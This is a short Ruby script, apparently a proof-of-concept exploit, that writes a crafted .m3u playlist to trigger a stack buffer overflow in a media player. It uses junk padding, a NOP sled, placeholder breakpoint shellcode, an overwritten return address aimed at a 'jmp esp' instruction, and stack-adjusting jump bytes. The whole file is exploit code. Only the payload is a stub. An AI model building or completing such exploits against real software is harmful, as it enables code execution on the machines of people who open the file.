#!/usr/bin/env ruby

exploit = "test1.m3u"

buffersize = 26065

junk = "\x41" * 250
nop = "\x90" * 50
shellcode = "\xcc"

restbuffer = "\x41" * (buffersize - (junk.size + nop.size + shellcode.size))

eip = "\x3A\xF2\xAA\x01" # Memory addres -> 01AAF23A     # OP Code for jmp esp FFE4
presc = "X" * 4
jumcode = "\x83\xc4\x5e" + #ESP + 281
"\x83\xc4\x5e" +
"\x83\xc4\x5e" +
"\xff\xe4"

nop2 = "\x90" * 10

buffer = junk + nop + shellcode + restbuffer

puts "Size of buffer: #{buffer.size}"

File.open(exploit, 'w'){|s| s.write(buffer + eip + presc + jumcode)}
puts "File created"